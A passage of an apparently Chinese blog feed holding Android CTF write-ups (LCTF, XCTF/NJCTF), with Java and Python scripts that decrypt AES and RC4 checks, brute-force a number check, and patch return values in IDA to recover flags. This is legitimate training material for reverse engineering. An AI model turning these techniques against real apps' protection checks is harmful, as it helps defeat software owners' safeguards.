&lt;p&gt;首先来看MainActivity，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate()&lt;/code&gt;函数中调用了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init_string_url_png()&lt;/code&gt;函数，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assets&lt;/code&gt;文件夹下的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url.png&lt;/code&gt;文件读取出来，然后获取其中16字节，并转换为String类型&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E7B440903AAFD04D5ABA024FCE9B9161.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;写个代码进行计算&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package test;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

public class Main {
	
	public static void main(String[] args) throws Exception{
		getKeyfromURLPNG();//从url.png中获取16字节的数据作为AES加密的key
	}
	
	public static void getKeyfromURLPNG() {
		try {
            File file = new File(&quot;url.png&quot;);
            FileInputStream inputStream_url_png = new FileInputStream(file);
            int url_png_length = inputStream_url_png.available();  // 获取读取到的数据长度
            byte[] url_png_byte = new byte[url_png_length];  // 定义等长byte数组
            inputStream_url_png.read(url_png_byte, 0, url_png_length);  // 将url.png的数据写到url_png_byte[]中
            byte[] v0_2 = new byte[16];
            System.arraycopy(url_png_byte, 144, v0_2, 0, 16);
            String string_url_png = new String(v0_2, &quot;utf-8&quot;);
            System.out.println(string_url_png);
        }
        catch(Exception v0) {
            v0.printStackTrace();
        }
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出，需要注意后面那个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;也是属于这个字符串的一部分&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;this_is_the_key.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后设置了按钮的点击事件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E0504C81E9DD26CFB0FBCE21945F10E0.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其中关键判断逻辑&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(MainActivity.call_vertify(this.mainActivity, 
							MainActivity.get_string_url_png(this.mainActivity), 
							this.mainActivity.findViewById(2131427414).getText().toString())) {
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_vertify()&lt;/code&gt;函数会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vertify()&lt;/code&gt;函数，然后调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;类的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_AESEnc()&lt;/code&gt;函数，最后将返回结果与后面那个字符串对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static String get_string_url_png(MainActivity arg1) {
    return arg1.string_url_png;  // this_is_the_key.
}

static boolean call_vertify(MainActivity mainActivity, String AES_KEY, String input) {
    return mainActivity.vertify(AES_KEY, input);
}

private boolean vertify(String AES_KEY, String input) {
    return new c().call_AESEnc(AES_KEY, input).equals(new String(new byte[]{21, -93, -68, -94, 86, 
            117, -19, -68, -92, 33, 50, 118, 16, 13, 1, -15, -13, 3, 4, 103, -18, 81, 30, 68, 54, 
            -93, 44, -23, 93, 98, 5, 59}));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;前面说这里会有AES的加密操作，这里并不进行AES加密以及秘钥处理的的操作，仅仅是做一个调用，但是从我的命名可以看出来，在进行秘钥初始化之前，这里会调用一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a()&lt;/code&gt;函数对密码进行处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/53E8AB675F1B779B7385AF5F325690A3.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里非常明显的是AES加密&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6E168ABE7A1E84FB8E26FEADB0073A18.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么现在就可以写代码进行还原了，由于加密后的数据知道，秘钥也知道，所以用Java还原&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package test;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.security.SecureRandom;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.omg.CORBA.StringHolder;

public class Main {
	
	public static void main(String[] args) throws Exception{
		getKeyfromURLPNG();//从url.png中获取16字节的数据作为AES加密的key
		Deryption();
	}
	
	public static void getKeyfromURLPNG() {
		try {
            File file = new File(&quot;url.png&quot;);
            FileInputStream inputStream_url_png = new FileInputStream(file);
            int url_png_length = inputStream_url_png.available();  // 获取读取到的数据长度
            byte[] url_png_byte = new byte[url_png_length];  // 定义等长byte数组
            inputStream_url_png.read(url_png_byte, 0, url_png_length);  // 将url.png的数据写到url_png_byte[]中
            byte[] v0_2 = new byte[16];
            System.arraycopy(url_png_byte, 144, v0_2, 0, 16);
            String string_url_png = new String(v0_2, &quot;utf-8&quot;);
            System.out.println(string_url_png);
        }
        catch(Exception v0) {
            v0.printStackTrace();
        }
	}
	
	public static void Deryption() {
		byte[] content = new byte[]{21, -93, -68, -94, 86, 117, -19, -68, -92, 33, 50, 118, 16, 13, 
			1, -15, -13, 3, 4, 103, -18, 81, 30, 68, 54, -93, 44, -23, 93, 98, 5, 59};
		String password = a(&quot;this_is_the_key.&quot;);
		System.out.println(password);
		try {  
            SecretKeySpec secretKeySpec = new SecretKeySpec(password.getBytes(), &quot;AES&quot;);
            Cipher cipher = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);
            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
            byte[] result = cipher.doFinal(content);
            System.out.println(new String(result));
		} catch (Exception e) {  
			e.printStackTrace();  
		}  
	}	
	
	public static String a(String input) {
        String result;
        try {
            input.getBytes(&quot;utf-8&quot;);
            StringBuilder stringBuilder = new StringBuilder();
            int i;
            for(i = 0; i &amp;lt; input.length(); i += 2) {
                stringBuilder.append(input.charAt(i + 1));
                stringBuilder.append(input.charAt(i));
            }
            result = stringBuilder.toString();
        }
        catch(Exception e) {
            e.printStackTrace();
            result = null;
        }
        return result;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;this_is_the_key.
htsii__sht_eek.y
LCTF{1t's_rea1ly_an_ea3y_ap4}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flag：LCTF{1t’s_rea1ly_an_ea3y_ap4}&lt;/p&gt;

&lt;p&gt;虽然没有so，但是面对这样的混淆，没有经验的新手或者说对AES算法不熟悉的新手足够被拦在一个小时外&lt;/p&gt;
</description>
                <pubDate>Fri, 17 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/17/2016-LCTF-easy-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/17/2016-LCTF-easy-100.html</guid>
            </item>
        
            <item>
                <title>2017 XCTF&NJCTF - easycrack-100</title>
                <description>&lt;p&gt;2017XCTF南京站线上赛的题目，同时也是2017NJCTF的题目，可以在XCTF OJ上面找到，分值100&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://oj.xctf.org.cn/practice/defensetrain/6e65e388244c434ca9b6d7c3f1e5aa81/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在Java层没有太多逻辑，对输入框进行监听，当有输入的时候调用native层的函数进行校验&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F98999D6B1428310EACF038F94577943.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;IDA载入so，没有动态注册，直接分析&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parseText()&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;前面会调用Java层的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meaasgeMe()&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3D63A01102C69B29CE19185049096419.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;messageMe&quot;()&lt;/code&gt;函数的功能是获取包名的最后一个串&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public String messageMe() {
    String result = &quot;&quot;;
    int t = 51;
    String[] paname = getApplicationContext().getPackageName().split(&quot;\\.&quot;);
    for (char ch : paname[paname.length - 1].toCharArray()) {
        t ^= ch;
        result = result + ((char) t);
    }
    return result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;写个代码跑&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class Main {
	
	public static void main(String[] args) throws Exception{
		String result = &quot;&quot;;
        int t = 51;
        String[] paname = &quot;com.njctf.mobile.easycrack&quot;.split(&quot;\\.&quot;);
        for (char ch : paname[paname.length - 1].toCharArray()) {
        	//System.out.println(ch);
            t ^= ch;
            result = result + ((char) t);
        }
        System.out.println(result);
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结果输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;V7D=^,M.E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后这个传入native层，转为char数组&lt;/p&gt;

&lt;p&gt;接着利用这个字符串对输入的字符串进行循环异或，就是把这个串循环复制自己，一个接一个，然后跟输入串长度一样，进行异或&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/706389D1E6382F6CD566664EC5D635D4.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;异或后存在新malloc出来的空间，首地址指针&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pvInput_new&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;然后是一个key，这里有的同学如果没有经验的话可能会看不出来这是RC4加密的key&lt;/p&gt;

&lt;p&gt;我看出这里是RC4加密的思路可以分享一下：&lt;/p&gt;

&lt;p&gt;首先是这个key，如果你那里是三个很奇怪的数字，可以右键然后看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R&lt;/code&gt;，就会和我这里一样的显示了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/96A80408B7EBF211ECE2F5E56457FA95.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;加下来有两个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;j_j_j__&lt;/code&gt;开头的函数，如果没有看出这里是RC4加密的秘钥初始化的话可以跟进去&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6BF8448EF666E96DF16865D212403A86.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟到最里面的实现，RC4的秘钥初始化有比较明显的特征&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1EC36A71863125C73FBA54AF109349BB.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后是后面的加密过程&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9EA8FB41B430B4AE83294280AC2331B8.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟进去，到最里面的实现过程，很明显的RC4加密&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/34CEAB44A73C163D8D9205FB24C82B62.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后的逻辑非常清楚，就是拷贝RC4加密后的数据然后跟一个字符串对比&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A9CD3A70E14735A3D304BC3BDFF8CEC8.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以到这里我们整理出流程：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;先输入数据，传入native层&lt;/li&gt;
  &lt;li&gt;native层获取Java层&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;messageMe()&lt;/code&gt;函数，根据包名获取到一个异或后的9字节字符串&lt;/li&gt;
  &lt;li&gt;循环使用异或后的字符串跟输入的字符串进行异或&lt;/li&gt;
  &lt;li&gt;将异或后的数据进行RC4加密，然后跟&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;compare&lt;/code&gt;字符串对比，一样则校验通过&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;写个Python脚本来还原&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# coding = utf-8

import binascii

def main():
	key_rc4 = &quot;I_am_the_key&quot;
	rc4_encrypted = binascii.a2b_hex(&quot;C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4&quot;)
	
	# Init rc4_key
	j = 0;
	s = range(256)
	for i in range(256):
		j = (j + s[i] + ord(key_rc4[i % len(key_rc4)])) % 256
		s[i], s[j] = s[j], s[i]
	i = 0
	j = 0
	
	# Rc4 decryption
	rc4_decrypted = []
	for data in rc4_encrypted:
		i = (i + 1) % 256
		j = (j + s[i]) % 256
		s[i], s[j] = s[j], s[i]
		rc4_decrypted.append(chr(ord(data) ^ s[(s[i] + s[j]) % 256]))
	rc4_decrypted =  &quot;&quot;.join(rc4_decrypted)
	#print rc4_decrypted

	key_xor = &quot;V7D=^,M.E&quot;
	key_xor_len = len(key_xor)
	Flag = []
	for i in range(len(rc4_decrypted)):
		 Flag.append(chr(ord(rc4_decrypted[i]) ^ ord(key_xor[i % key_xor_len])))
	print &quot;&quot;.join(Flag)

if __name__ == '__main__':
	main()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;运行结果&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;It_s_a_easyCrack_for_beginners
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这也是Flag，直接提交就行了&lt;/p&gt;

&lt;p&gt;难度一般，就是有一点不好，SDK要求24，尼玛这是7.0啊！！！！！！还好不运行可以搞出来，不然真的要吊打出题人:)&lt;/p&gt;

&lt;p&gt;另，今天pwn2own超级精彩，目前中国的战绩：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;数字：攻破Adobe Reader&lt;/li&gt;
  &lt;li&gt;鹅场：攻破Microsoft Edge&lt;/li&gt;
  &lt;li&gt;鹅场：攻破Adobe Reader&lt;/li&gt;
  &lt;li&gt;长亭：攻破Linux&lt;/li&gt;
  &lt;li&gt;长亭：攻破Safari&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;期待有生之年能去现场围观膜拜各位大佬&lt;/p&gt;
</description>
                <pubDate>Thu, 16 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/16/2017-XCTF&NJCTF-easycrack-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/16/2017-XCTF&NJCTF-easycrack-100.html</guid>
            </item>
        
            <item>
                <title>2017 XCTF&NJCTF - SafeBox-100</title>
                <description>&lt;p&gt;2017XCTF&amp;amp;NJCTF线上赛的Mobile题，纯Java层，分值100，可以在XCTF OJ上找到&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://oj.xctf.org.cn/practice/defensetrain/f9579c8bc29141228376918b10ba4b89/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;大概的意思就是说，输入一个数字，然后结果一系列的判断，输出Flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E47428AC325548EC232774475AFE13C2.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;鉴于数字的判断范围已经知道，写个代码遍历一下就行了，然而比较懒，直接用反编译出来的Java代码&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package test;

public class Main {
	
	public static void main(String[] args) throws Exception{
		
        for(int v4 = 10000001; v4 &amp;lt; 99999999; v4++) {
        	String v6 = &quot;NJCTF{&quot;;
            
            if(v4 &amp;gt; 10000000 &amp;amp;&amp;amp; v4 &amp;lt; 99999999) {
                int v7 = 1;
                int v8 = 10000000;
                int v3 = 1;
                if(Math.abs(v4 / 1000 % 100 - 36) == 3 &amp;amp;&amp;amp; v4 % 1000 % 584 == 0) {
                    int v5 = 0;
                    while(v5 &amp;lt; 4) {
                        if(v4 / v7 % 10 != v4 / v8 % 10) {
                            v3 = 0;
                        }
                        else {
                            v7 *= 10;
                            v8 /= 10;
                            ++v5;
                            continue;
                        }

                        break;
                    }

                    if(v3 != 1) {
                        continue;
                    }

                    System.out.println(v6 + (((char)(v4 / 1000000))) + (((char)(v4 / 10000 % 100))) + (((char)(v4 / 100 % 100))) + &quot;f4n}&quot;);
                }
            }
        }
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NJCTF{05#f4n}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然而Problem Description是这样描述的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Don't believe what you saw.

The flag's format is NJCTF{xxx} and xxx only include [a-z][A-Z][0-9].
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;肯定是不对的，继续思考，发现还有一个类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;androidTest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/659BA49F5149DEAB5F9EEC6E17D8C8E0.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;和之前的Activity内容类似，尝试遍历这个类的代码&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package test;

public class Main {
	
	public static void main(String[] args) throws Exception{
		
        for(int v4 = 10000001; v4 &amp;lt; 99999999; v4++){
        	int v11 = 3;
            String v6 = &quot;NJCTF{have&quot;;
            if(v4 &amp;gt; 10000000 &amp;amp;&amp;amp; v4 &amp;lt; 99999999) {
                int v7 = 1;
                int v8 = 10000000;
                int v3 = 1;
                if(Math.abs(v4 / 1000 % 100 - 36) == v11 &amp;amp;&amp;amp; v4 % 1000 % 584 == 0) {
                    int v5 = 0;
                    while(v5 &amp;lt; v11) {
                        if(v4 / v7 % 10 != v4 / v8 % 10) {
                            v3 = 0;
                        }
                        else {
                            v7 *= 10;
                            v8 /= 10;
                            ++v5;
                            continue;
                        }

                        break;
                    }

                    if(v3 != 1) {
                        continue;
                    }

                    System.out.println(v6 + (((char)(v4 / 1000000))) + (((char)(v4 / 10000 % 100))) + (((char)(v4 / 100 % 100 + 10))) + &quot;f4n}&quot;);
                }
            }
        }
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NJCTF{have05-f4n}
NJCTF{have05if4n}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么Flag就有了&lt;/p&gt;

&lt;p&gt;这么简单的题目还要换Flag？&lt;/p&gt;

&lt;p&gt;扎心不，老铁？&lt;/p&gt;
</description>
                <pubDate>Thu, 16 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/16/2017-XCTF&NJCTF-SafeBox-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/16/2017-XCTF&NJCTF-SafeBox-100.html</guid>
            </item>
        
            <item>
                <title>2017 XCTF&NJCTF - LittleRotatorGame-200</title>
                <description>&lt;p&gt;2017XCTF南京站线上赛同时也是NJCTF的Mobile题，一度做的我怀疑人生，题目可以在XCTF OJ上面找到&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://oj.xctf.org.cn/practice/defensetrain/5584ce8300114ceabd14f1fdea1669cd/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这是一个纯native的APP，拿到手后看到没有Java层的Activity，当时就把我吓蒙了，上一次看到没有Activity的APP还是Android 4.x的时候，当时允许无Activity跑应用，于是就有好多病毒利用这点搞啊搞……&lt;/p&gt;

&lt;p&gt;题目要继续做啊，临时到谷歌爸爸那里学习&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://developer.android.com/reference/android/app/NativeActivity.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;给的是一个根据手机重力传感器的三个值然后显示相应颜色的APP，看的头都晕了&lt;/p&gt;

&lt;p&gt;看不下去了，于是决定先看so，IDA打开so&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D3518F55CC05C88D98FFE0D6F32E83F1.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我去！！！！！！&lt;/p&gt;

&lt;p&gt;这尼玛什么鬼！！！！！！&lt;/p&gt;

&lt;p&gt;200分的题目至于上O-LLVM混淆嘛？？？？？？&lt;/p&gt;

&lt;p&gt;至于如何搞O-LLVM，以后专门整理一篇文章分享一下个人经验&lt;/p&gt;

&lt;p&gt;总结出流程&lt;/p&gt;

&lt;p&gt;首先通过传感器获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(x, y, z)&lt;/code&gt;三个值，之后传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a_process()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D21970D567385699FA24586A31F922C8.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当然，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a_process()&lt;/code&gt;函数也是使用O-LLVM混淆了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EB37C882150FD785FDE938FC4F5B9187.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a_process()&lt;/code&gt;后会有一个判断&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/857462AEB0A00E22CAB7930A751EE54D.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a_process()&lt;/code&gt;的返回值不是6，直接和数组对比&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E2D3A10E323E1164FD956A95B384F2DE.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果返回值为6，则调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b_process()&lt;/code&gt;，并将两个返回值相加再跟数组对比&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/556127679658742606A73C4954F771A9.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b_process()&lt;/code&gt;函数同样使用了O-LLVM混淆&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/5F5B5BCA1E704E49470E9E84CCDDCEC9.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;对比的数组&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.rodata:0000785C dword_785C      DCD 2, 7, 5, 3, 2, 9, 4, 1, 3, 6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一共十个数字，也就是说要对比十次&lt;/p&gt;

&lt;p&gt;那么我们可以通过动态调试伪造输入，当对比的数据为7和9时，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a_process()&lt;/code&gt;的返回值设为6，并将b的返回值设为1和3&lt;/p&gt;

&lt;p&gt;使用IDA动态调试，先计算出两个调用点的地址然后下断点&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex(0x38A6 + 0x7389F000)
'0x738a28a6'
&amp;gt;&amp;gt;&amp;gt; hex(0x3BE2 + 0x7389F000)
'0x738a2be2'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;断点下好后，一直F9，当R0的值保持为2不变，即可进行十次对比&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BA03E37D2F27E8CE4CC9FCD0E3AB4E97.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;数组第二个数字是7，所以需要将R0修改为6&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0AA9881DEBF05FA6AC40164A3480C6CF.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时会在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b_process()&lt;/code&gt;断下，将返回值修改为1，如果已经为1则不需要修改&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/250FE842FAF1C9CB3424927C88BDF68E.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;按照这种方法对比完数组的十个数据，在Android Device Monitor输出Flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7C1814CB95F60485B393C0E797DF5498.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;动态调试的过程并不是很难，唯一需要注意的是，注意手机要立着:)&lt;/p&gt;

&lt;p&gt;Flag：njctf{PvrNa7iv3Al1}&lt;/p&gt;

&lt;p&gt;O-LLVM混淆这种大杀器想必是难倒了一大波人吧，各种跳转……&lt;/p&gt;

&lt;p&gt;其实一开始运行APP就可以发现，这就是谷歌官网用于演示NativeActivity的Demo，出题人你出来我们聊聊人生&lt;/p&gt;
</description>
                <pubDate>Thu, 16 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/16/2017-XCTF&NJCTF-LittleRotatorGame-200.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/16/2017-XCTF&NJCTF-LittleRotatorGame-200.html</guid>
            </item>
        
            <item>
                <title>2016 AliCTF - Timer-50</title>
                <description>&lt;p&gt;2016年阿里CTF的第一道Mobile题，分值50&lt;/p&gt;

